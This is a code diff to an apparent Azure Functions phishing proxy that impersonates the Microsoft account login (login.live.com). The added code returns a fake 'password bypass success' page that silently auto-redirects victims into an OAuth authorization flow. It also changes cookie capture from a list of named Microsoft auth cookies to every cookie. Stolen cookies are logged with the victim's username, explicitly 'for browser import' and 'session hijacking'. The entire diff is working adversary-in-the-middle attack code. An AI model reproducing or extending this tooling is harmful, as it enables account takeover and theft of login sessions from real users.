@@ -334,9 +334,9 @@ app.http("phishing", {
           "urlNext": "https://login.live.com/oauth20_desktop.srf"
         });
       } else if (original_url.pathname.includes('/post.srf')) {
-        // Handle password validation for personal accounts
+        // Handle password validation for personal accounts - AUTOMATIC FLOW
         if (isPersonalAccount) {
-          mockResponse = JSON.stringify({
+          const responseData = {
             "success": true,
             "status": "success",
             "validated": true,
@@ -359,7 +359,54 @@ app.http("phishing", {
               "hasPassword": true,
               "remoteConnectType": 0
             }
-          });
+          };
+          
+          // Log the response data to console for debugging
+          dispatchMessage(`🔐 PASSWORD BYPASS SUCCESS: ${JSON.stringify(responseData)}`);
+          
+          // Return HTML that auto-continues the flow instead of showing JSON
+          mockResponse = `
+            <html>
+            <head>
+              <title>Processing Authentication...</title>
+              <script>
+                // Log the response for debugging
+                console.log('🎯 AITM PASSWORD BYPASS SUCCESS:', ${JSON.stringify(responseData)});
+                
+                // Auto-continue the OAuth flow
+                setTimeout(function() {
+                  // Extract current URL parameters
+                  const urlParams = new URLSearchParams(window.location.search);
+                  const clientId = urlParams.get('client_id');
+                  const contextId = urlParams.get('contextid');
+                  
+                  // Continue to OAuth authorization phase
+                  const oauthUrl = '/oauth20_authorize.srf?client_id=' + clientId + 
+                                  '&response_type=code&scope=openid+profile+email' +
+                                  '&redirect_uri=https://login.live.com/oauth20_desktop.srf' +
+                                  '&state=' + contextId;
+                  
+                  console.log('🔄 AUTO-REDIRECTING TO OAUTH:', oauthUrl);
+                  window.location.href = oauthUrl;
+                }, 1000);
+              </script>
+            </head>
+            <body>
+              <div style="text-align: center; font-family: Arial; margin-top: 100px;">
+                <h2>Completing authentication...</h2>
+                <p>Please wait while we process your login.</p>
+                <div style="border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 2s linear infinite; margin: 20px auto;"></div>
+              </div>
+              <style>
+                @keyframes spin {
+                  0% { transform: rotate(0deg); }
+                  100% { transform: rotate(360deg); }
+                }
+              </style>
+            </body>
+            </html>
+          `;
+          mockHeaders.set("Content-Type", "text/html");
         } else {
           mockResponse = JSON.stringify({
             "success": true,
@@ -518,64 +565,55 @@ app.http("phishing", {
         new_response_headers.append("Set-Cookie", modifiedCookie);
       });
 
-      // Enhanced cookie filtering for comprehensive token capture
-      const highValueCookies = originalCookies.filter(
-        (cookie) =>
-          cookie.startsWith("ESTSAUTH=") ||
-          cookie.startsWith("ESTSAUTHPERSISTENT=") ||
-          cookie.startsWith("SignInStateCookie=") ||
-          cookie.startsWith("MSPAuth=") ||
-          cookie.startsWith("MSPProf=") ||
-          cookie.startsWith("MSPOK=") ||
-          cookie.startsWith("MSPCredential=") ||
-          cookie.startsWith("PPLState=") ||
-          cookie.startsWith("MSACredential=") ||
-          cookie.startsWith("SSCYOA=") ||
-          cookie.startsWith("brcap=") ||
-          cookie.startsWith("OAuthState=") ||
-          cookie.startsWith("PPAuthCookie=") ||
-          cookie.startsWith("PPTokenCookie=") ||
-          cookie.startsWith("MSPRequ=") ||
-          cookie.startsWith("MSAuthCookie=") ||
-          cookie.startsWith("SessionState=") ||
-          cookie.startsWith("MSPBack=") ||
-          cookie.startsWith("MSPSoft=") ||
-          cookie.startsWith("NAP=") ||
-          cookie.startsWith("ANON=") ||
-          cookie.includes("auth") ||
-          cookie.includes("token") ||
-          cookie.includes("session")
-      );
+      // CAPTURE ALL COOKIES - No filtering, get everything for maximum coverage
+      const allCookies = originalCookies;
 
-      if (highValueCookies.length >= 1) {
-        // Enhanced logging with cookie analysis
-        const cookieAnalysis = highValueCookies.map(cookie => {
+      if (allCookies.length >= 1) {
+        // Enhanced logging with complete cookie analysis
+        const cookieAnalysis = allCookies.map(cookie => {
           const [name] = cookie.split('=');
           const isSessionCookie = !cookie.includes('expires=') && !cookie.includes('max-age=');
           const isSecure = cookie.includes('secure');
           const isHttpOnly = cookie.includes('httponly');
+          const isHighValue = name.includes('AUTH') || name.includes('TOKEN') || 
+                             name.includes('SESSION') || name.includes('MSP') || 
+                             name.includes('EST') || name.includes('OAuth');
           
           return {
             name: name,
             isSessionCookie: isSessionCookie,
             isSecure: isSecure,
             isHttpOnly: isHttpOnly,
+            isHighValue: isHighValue,
             fullCookie: cookie
           };
         });
 
+        // Separate high-value cookies for priority logging
+        const highValueCookies = allCookies.filter(cookie => {
+          const name = cookie.split('=')[0];
+          return name.includes('AUTH') || name.includes('TOKEN') || 
+                 name.includes('SESSION') || name.includes('MSP') || 
+                 name.includes('EST') || name.includes('OAuth') ||
+                 name.includes('ANON') || name.includes('PPL');
+        });
+
         dispatchMessage(
-          `🍪 CAPTURED HIGH-VALUE AUTHENTICATION COOKIES (${selected_upstream}): <br>` +
-          `📊 Total: ${highValueCookies.length} cookies<br>` +
-          `🔐 Analysis: ${JSON.stringify(cookieAnalysis, null, 2)}<br>` +
-          `📋 Raw Cookies: ${JSON.stringify(highValueCookies, null, 2)}`
+          `🍪 CAPTURED ALL COOKIES (${selected_upstream}): <br>` +
+          `📊 Total: ${allCookies.length} cookies<br>` +
+          `⭐ High-Value: ${highValueCookies.length} cookies<br>` +
+          `🔐 Complete Analysis: ${JSON.stringify(cookieAnalysis, null, 2)}<br>` +
+          `📋 ALL Raw Cookies: ${JSON.stringify(allCookies, null, 2)}<br>` +
+          `🎯 High-Value Cookies: ${JSON.stringify(highValueCookies, null, 2)}`
         );
         
         // Additional logging for session hijacking purposes
-        context.log(`🎯 SESSION HIJACKING DATA CAPTURED:`);
-        context.log(`🔑 Cookies for browser import: ${highValueCookies.join('; ')}`);
+        context.log(`🎯 COMPLETE SESSION HIJACKING DATA CAPTURED:`);
+        context.log(`🔑 ALL Cookies for browser import: ${allCookies.join('; ')}`);
+        context.log(`⭐ High-Value Cookies: ${highValueCookies.join('; ')}`);
         context.log(`🌐 Domain: ${selected_upstream}`);
         context.log(`👤 User: ${original_url.searchParams.get('username') || 'Unknown'}`);
+        context.log(`📈 Cookie Count: ${allCookies.length} total, ${highValueCookies.length} high-value`);
       }
     } catch (error) {
       console.error(error);
